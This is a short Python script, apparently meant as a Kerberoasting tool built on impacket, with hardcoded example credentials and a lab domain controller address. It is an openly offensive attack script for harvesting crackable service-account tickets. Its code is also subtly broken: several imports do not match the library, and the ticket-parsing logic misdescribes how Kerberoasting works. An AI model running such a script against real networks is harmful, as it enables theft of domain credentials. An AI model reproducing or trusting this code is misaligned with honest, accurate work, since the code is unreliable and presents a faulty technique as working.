from impacket.kerberos import KerberosCredential
from impacket.kerberos import KerberosTarget
from impacket.kerberos import getKerberosTGT
from impacket.kerberos import getKerberosTGS
from impacket.krb5 import constants
from impacket.krb5.asn1 import EncTicketPart
from impacket.krb5.types import Principal
from impacket.krb5 import checksums

def kerberoast(username, password, domain, dc_ip):
    try:
        # Get TGT for the specified user
        tgt, cipher = getKerberosTGT(username, password, domain, None, None, None)

        # Construct a KerberosCredential object
        kerberos_credential = KerberosCredential(username=username, password=password, domain=domain)

        # Construct a KerberosTarget object
        kerberos_target = KerberosTarget(domain=domain, dc_ip=dc_ip, protocol=constants.EncryptionTypes.aes256_cts_hmac_sha1_96)

        # Get TGS for the specified user
        tgs, cipher = getKerberosTGS(kerberos_credential, kerberos_target, cipher, krbtgt=tgt)

        # Extract kerberoastable accounts
        kerberoastable_accounts = extract_kerberoastable_accounts(tgs)

        if kerberoastable_accounts:
            print("Kerberoastable Accounts:")
            for account in kerberoastable_accounts:
                print(account)
        else:
            print("No kerberoastable accounts found.")

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")

def extract_kerberoastable_accounts(tgs):
    kerberoastable_accounts = []

    # Parse TGS response
    enc_tkt_part = EncTicketPart.load(tgs['ticket']['enc-part'])
    server_name = Principal(enc_tkt_part['cname']).components_to_string()

    # Extract kerberoastable accounts
    for auth_data in enc_tkt_part['authorization-data']:
        if auth_data['ad-type'] == constants.AuthorizationDataType.AD_WIN2K_PAC.value:
            pac = auth_data['ad-data'].native
            for pac_entry in pac['groups']:
                if pac_entry['name'] == 'RODC Compatible':
                    continue
                for member in pac_entry['members']:
                    kerberoastable_accounts.append(member['user'])

    return kerberoastable_accounts

# Example usage:
# Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
username = "ajman"
password = "DomainAdmin123!"
domain = "snaplabs.local"
dc_ip = "10.10.0.86"  # Replace with your domain controller's IP address

kerberoast(username, password, domain, dc_ip)